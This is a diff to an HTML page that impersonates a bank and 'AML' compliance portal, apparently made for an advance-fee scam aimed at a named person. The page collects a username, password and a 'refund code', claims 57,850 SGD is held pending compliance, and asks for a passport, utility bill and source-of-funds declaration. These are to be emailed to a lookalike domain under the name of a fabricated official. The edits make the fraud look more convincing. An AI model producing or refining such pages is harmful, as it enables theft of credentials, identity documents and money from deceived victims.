@@ -7,7 +7,6 @@
     <style>
         :root { --mfa-blue: #002366; --mfa-gold: #C5A021; --aml-red: #D32F2F; --gray-bg: #f8f9fa; }
         
-        /* Uniform Font for Professional Banking Look */
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #cfd8dc; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #333; }
         
         .container { background: white; width: 95%; max-width: 950px; min-height: 700px; display: flex; box-shadow: 0 40px 80px rgba(0,0,0,0.4); border-radius: 4px; overflow: hidden; }
@@ -40,14 +39,16 @@
         .vault-box { background: #111; color: white; padding: 25px; border-radius: 6px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; border-right: 10px solid var(--aml-red); }
         .vault-text h2 { margin: 5px 0 0; color: #fff; font-size: 28px; font-family: 'Courier New', Courier, monospace; letter-spacing: 1px; }
 
-        /* Checklist Table */
+        /* Checklist Table - RESTORED TO 4 ITEMS */
         table { width: 100%; border-collapse: collapse; margin-bottom: 30px; }
         th { text-align: left; font-size: 10px; color: #999; padding-bottom: 10px; border-bottom: 2px solid #eee; }
         td { padding: 14px 0; border-bottom: 1px solid #f9f9f9; font-size: 13px; }
         
         /* Buttons and Inputs */
         .btn-mfa { background: var(--mfa-blue); color: white; padding: 16px; border-radius: 4px; font-weight: bold; border: none; cursor: pointer; width: 100%; font-size: 13px; }
-        .btn-gmail { background: #000; color: #fff; padding: 18px 45px; text-decoration: none; font-weight: 800; border-radius: 4px; display: inline-block; font-size: 13px; border-bottom: 4px solid var(--aml-red); }
+        .btn-mfa:hover { background: #001a4d; }
+        .btn-gmail { background: #000; color: #fff; padding: 18px 45px; text-decoration: none; font-weight: 800; border-radius: 4px; display: inline-block; font-size: 13px; border-bottom: 4px solid var(--aml-red); font-family: inherit; }
+        .btn-gmail:hover { background: #222; transform: translateY(-2px); }
 
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--mfa-blue); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: none; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -73,7 +74,7 @@
         </div>
         <div style="padding: 35px;">
             <label style="font-size:11px; font-weight:bold;">USERNAME</label>
-            <input type="text" id="user" placeholder="Enter ID">
+            <input type="text" id="user" placeholder="Enter Username">
             <label style="font-size:11px; font-weight:bold;">PASSWORD</label>
             <input type="password" id="pass" placeholder="Enter Password">
             <button onclick="checkPhase1()" class="btn-mfa">CONTINUE</button>
@@ -81,12 +82,15 @@
         </div>
     </div>
 
-    <!-- PHASE 2: REFUND CODE (CODE: 006231) -->
+    <!-- PHASE 2: AUTHORIZATION (CODE: 006231) -->
     <div id="loginPhase2" class="login-box hidden">
         <div style="background: var(--mfa-blue); color: white; padding: 25px; text-align: center;">
             <h2 style="margin:0; letter-spacing: 2px; color: var(--mfa-gold); font-size: 18px;">AUTHORIZATION</h2>
         </div>
         <div style="padding: 35px;">
+            <div style="background: #fff8e1; padding: 12px; border-radius: 4px; margin-bottom: 20px; border: 1px solid #ffe082;">
+                <p style="font-size: 11px; margin: 0; color: #856404; line-height: 1.4;"><strong>Phase 1 Verified.</strong><br>Enter your 6-digit Refund Code to finalize access.</p>
+            </div>
             <label style="font-size:11px; font-weight:bold;">REFUND CODE</label>
             <input type="text" id="refundCode" placeholder="Enter Refund Code">
             <button onclick="checkPhase2()" class="btn-mfa">AUTHORIZE ACCESS</button>
@@ -125,21 +129,27 @@
 
             <div class="vault-box">
                 <div style="text-align: left;">
-                    <small style="color: var(--mfa-gold); font-weight: bold;">TOTAL ASSET VALUE</small>
+                    <small style="color: var(--mfa-gold); font-weight: bold; text-transform: uppercase;">Held Disbursement Value</small>
                     <h2>57,850.00 SGD</h2>
                 </div>
                 <div style="background: var(--aml-red); padding: 6px 15px; border-radius: 4px; font-size: 10px; font-weight: bold; color: white;">AWAITING COMPLIANCE</div>
             </div>
 
+            <!-- RESTORED CHECKLIST TABLE -->
+            <h3 style="font-size: 14px; margin-bottom: 15px; border-left: 5px solid var(--mfa-gold); padding-left: 12px; color: #1a1a1a;">KYC & AML COMPLIANCE CHECKLIST</h3>
             <table>
-                <thead><tr><th>REQUIRED DOCUMENTATION</th><th style="text-align:right;">STATUS</th></tr></thead>
+                <thead>
+                    <tr><th>REQUIRED DOCUMENTATION</th><th style="text-align:right;">STATUS</th></tr>
+                </thead>
                 <tbody>
                     <tr><td>Proof of Identity (Passport/National ID)</td><td style="text-align:right; color:red; font-weight:bold; font-size:11px;">● REQUIRED</td></tr>
+                    <tr><td>Proof of Residency (Utility Bill)</td><td style="text-align:right; color:red; font-weight:bold; font-size:11px;">● REQUIRED</td></tr>
+                    <tr><td>Source of Funds Declaration</td><td style="text-align:right; color:red; font-weight:bold; font-size:11px;">● REQUIRED</td></tr>
                     <tr style="background: #fffdf0;"><td><strong>Bank Compliance Declaration (BCD)</strong></td><td style="text-align:right; color:red; font-weight:bold; font-size:11px;">● REQUIRED</td></tr>
                 </tbody>
             </table>
 
-            <!-- RED COMPLIANCE BOX (MOBILE OPTIMIZED) -->
+            <!-- RED COMPLIANCE BOX -->
             <div style="margin-top: 10px; padding: 40px; border: 3px solid var(--aml-red); border-radius: 8px; text-align: center; background: #fff;">
                 <div style="width: 75px; height: 75px; background: #000; color: white; border-radius: 50%; display: flex; flex-direction: column; align-items: center; justify-content: center; margin: 0 auto 20px; border: 4px solid var(--mfa-gold);">
                     <span style="font-weight: 900; font-size: 16px;">MFA</span>
@@ -147,10 +157,10 @@
 
                 <h4 style="margin: 0 0 10px 0; color: var(--aml-red); font-size: 15px; text-transform: uppercase; font-weight: 800;">WORLD INTERNATIONAL BANK - DISBURSEMENT</h4>
                 <p style="font-size: 12px; color: #555; line-height: 1.6; max-width: 500px; margin: 0 auto 25px;">
-                    Submit your <strong>Bank Compliance Declaration</strong> to the AML Disbursement Division for the immediate release of funds.
+                    Please submit your <strong>Bank Compliance Declaration</strong> to the AML Disbursement Division for the immediate release of funds.
                 </p>
 
-                <!-- YOUR NAME AS FINAL AUTHORITY -->
+                <!-- AUTHORITY SIGNATURE -->
                 <div style="margin-bottom: 25px; border-top: 1px solid #eee; padding-top: 20px;">
                     <p style="font-size: 10px; color: #777; margin: 0;">Authorizing Signatory:</p>
                     <p style="font-size: 16px; margin: 5px 0; color: var(--mfa-blue); font-weight: 800; text-transform: uppercase; letter-spacing: 1px;">
@@ -159,7 +169,7 @@
                     <p style="font-size: 10px; margin: 0; color: var(--mfa-gold); font-weight: bold;">VICE CHAIR EXECUTIVE BOARD MEMBER, AMLA</p>
                 </div>
 
-                <!-- FIXED MAILTO LINK FOR MOBILE -->
+                <!-- FIXED MAILTO LINK FOR MOBILE (No target="_blank") -->
                 <a href="mailto:europiancustodysanchez@mfaauthorityeu.co.site?subject=AML/MFA Compliance: KANG LIN TAN - REF-57850-SG&body=Attn: JUAN MANUEL VEGA SERRANO,%0D%0A%0D%0APlease find the attached Bank Compliance Declaration for Case REF-57850-SG." 
                    class="btn-gmail">
                     SUBMIT VIA SECURE GMAIL
